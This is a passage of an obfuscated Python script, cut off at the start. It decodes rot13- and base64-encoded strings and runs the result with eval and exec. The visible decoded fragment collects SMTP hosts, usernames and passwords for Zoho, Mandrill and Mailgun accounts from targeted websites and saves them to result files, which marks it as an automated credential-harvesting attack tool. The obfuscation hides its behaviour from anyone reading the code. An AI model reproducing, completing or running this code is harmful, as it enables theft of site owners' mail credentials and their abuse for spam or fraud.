JvbW5hbWUpCgkJCQkJCXJlbW92ZXIgPSBzdHIoYnVpbGQpLnJlcGxhY2UoJ1wnJywgJycpCgkJCQkJCXNhdmUgPSBvcGVuKCdSZXN1bHRzL3pvaG8udHh0JywgJ2EnKQoJCQkJCQlzYXZlLndyaXRlKHJlbW92ZXIrJ1wKXAonKQoJCQkJCQlzYXZlLmNsb3NlKCkKCQkJCQllbGlmICdtYW5kcmlsbGFwcCcgaW4gbWFpbGhvc3Q6CgkJCQkJCWJ1aWxkID0gJ1VSTDogJytzdHIodXJsKSsnXApNRVRIT0Q6ICcrc3RyKG1ldGhvZCkrJ1wKTUFJTEhPU1Q6ICcrc3RyKG1haWxob3N0KSsnXApNQUlMUE9SVDogJytzdHIobWFpbHBvcnQpKydcCk1BSUxVU0VSOiAnK3N0cihtYWlsdXNlcikrJ1wKTUFJTFBBU1M6ICcrc3RyKG1haWxwYXNzKSsnXApNQUlMRlJPTTogJytzdHIobWFpbGZyb20pKydcCkZST01OQU1FOiAnK3N0cihmcm9tbmFtZSkKCQkJCQkJcmVtb3ZlciA9IHN0cihidWlsZCkucmVwbGFjZSgnXCcnLCAnJykKCQkJCQkJc2F2ZSA9IG9wZW4oJ1Jlc3VsdHMvbWFuZHJpbGwudHh0JywgJ2EnKQoJCQkJCQlzYXZlLndyaXRlKHJlbW92ZXIrJ1wKXAonKQoJCQkJCQlzYXZlLmNsb3NlKCkKCQkJCQllbGlmICdtYWlsZ3VuJyBpbiBtYWlsaG9zdDoKCQkJCQkJYnVpbGQgPSAnVVJMOiAnK3N0cih1cmwpKydcCk1FVEhPRDogJytzdHIobWV0aG9kKSsnXApNQUlMSE9TVDogJytzdHIobWFpbGhvc3QpKydcCk1BSUxQT1JUOiAnK3N0cihtYWlscG9ydCkrJ1wKTUFJTFVTRVI6ICcrc3RyKG1haWx1c2VyKSsnXApNQUlMUEFTUzogJytzdHIobWFpbHBhc3MpKydcCk1BSUxGUk9NOiAnK3N0cihtYWlsZnJvbSkrJ1wKRlJPTU5BTUU6ICcrc3RyKGZyb21uYW1lKQoJCQkJCQlyZW1vdmVyID0gc3RyKGJ1aWxkKS5yZXBsYWNlKCdcJycsICcnKQoJCQkJCQlzYXZlID0gb3BlbignUmVzdWx0cy9tYWlsZ3VuLnR4dCcsICdhJykKCQkJCQkJc2F2ZS53cml0ZShyZ'
destiny = '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'
joy = '\x72\x6f\x74\x31\x33'
trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))